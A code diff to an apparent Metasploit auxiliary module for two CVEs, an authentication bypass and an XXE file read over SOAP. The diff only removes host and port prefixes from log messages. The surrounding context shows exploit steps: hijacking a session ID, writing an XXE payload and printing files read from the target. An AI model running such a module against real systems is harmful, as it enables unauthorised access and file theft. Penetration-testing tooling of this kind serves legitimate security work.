@@ -103,12 +103,12 @@ class MetasploitModule < Msf::Auxiliary
     # Test for CVE-2025-9316 (Authentication Bypass)
     session_id, appliance_id = test_auth_bypass
     unless session_id && appliance_id
-      vprint_status("#{ip}:#{rport} - Not vulnerable to CVE-2025-9316 or requires different appliance ID")
+      vprint_status("Not vulnerable to CVE-2025-9316 or requires different appliance ID")
       return
     end
 
-    print_good("#{ip}:#{rport} - Vulnerable to CVE-2025-9316 (Authentication Bypass)")
-    print_good("#{ip}:#{rport} - Obtained session ID: #{session_id} (appliance ID: #{appliance_id})")
+    print_good("Vulnerable to CVE-2025-9316 (Authentication Bypass)")
+    print_good("Obtained session ID: #{session_id} (appliance ID: #{appliance_id})")
 
     report_vuln(
       host: ip,
@@ -135,7 +135,7 @@ class MetasploitModule < Msf::Auxiliary
 
       res = send_soap_request('/dms/services/ServerUI', soap_body)
       unless res
-        vprint_error("#{rhost}:#{rport} - No response from server, stopping")
+        vprint_error("No response from server, stopping")
         return [nil, nil]
       end
 
@@ -183,11 +183,11 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     unless file_content
-      vprint_status("#{rhost}:#{rport} - XXE triggered but could not extract file contents from response (timeout or no content)")
+      vprint_status("XXE triggered but could not extract file contents from response (timeout or no content)")
       return
     end
 
-    print_good("#{rhost}:#{rport} - XXE file read succeeded (CVE-2025-11700)")
+    print_good("XXE file read succeeded (CVE-2025-11700)")
     print_line
     print_line(file_content)
     print_line
@@ -241,7 +241,7 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_soap_request('/dms/services/ServerMMS', soap_body)
     unless res
-      vprint_error("#{rhost}:#{rport} - No response from server when writing XXE payload, stopping")
+      vprint_error("No response from server when writing XXE payload, stopping")
       return false
     end
     res.code == 200
